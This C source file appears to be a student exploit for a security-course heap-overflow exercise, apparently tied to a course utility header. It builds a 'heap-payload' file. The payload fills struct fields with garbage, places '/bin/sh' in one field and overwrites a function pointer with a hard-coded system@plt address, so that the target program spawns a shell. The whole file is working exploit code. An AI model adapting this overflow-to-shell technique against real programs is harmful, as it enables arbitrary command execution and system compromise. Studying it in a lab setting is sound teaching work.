
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cse543-util.h"

#define pack(addr, offset, value)  (*((int **)(addr+offset)) = value)

int main(int argc, char **argv)
{
	char* buf = (char *) malloc(4);

	/* write argument to file */
	write_to_file( "heap-payload", "struct A 40\n", 12, FILE_CLEAR );

	//Prepare the arguments in string_d
	write_to_file( "heap-payload", "string_b adfadfaaaaaaaaaa", 25, FILE_APPEND);// put garbage in string_b
	write_to_file( "heap-payload", "1234", 4, FILE_APPEND);// put garbage in num_c
	write_to_file( "heap-payload", "/bin/sh\n", 8, FILE_APPEND);// overflow string_d with '/bin/sh' and end

	//Overflow op0
	write_to_file( "heap-payload", "string_f adfadfaaaaaaaaaa", 25, FILE_APPEND); //put garbage in string_f
	write_to_file( "heap-payload", "1234", 4, FILE_APPEND);//overflow num_g 
	write_to_file( "heap-payload", "1234", 4, FILE_APPEND);//overflow num_h
	pack(buf, 0, (int *)0x8049174);
	write_to_file( "heap-payload", buf, 4, FILE_APPEND);//overflow op0 with <system@plt> pointer
	write_to_file( "heap-payload", "\n", 1, FILE_APPEND);//end

	//Call system(/bin/sh)
	write_to_file( "heap-payload", "string_d abc", 12, FILE_APPEND); //call system(/bin/sh) !

	free(buf);

	exit(0);
}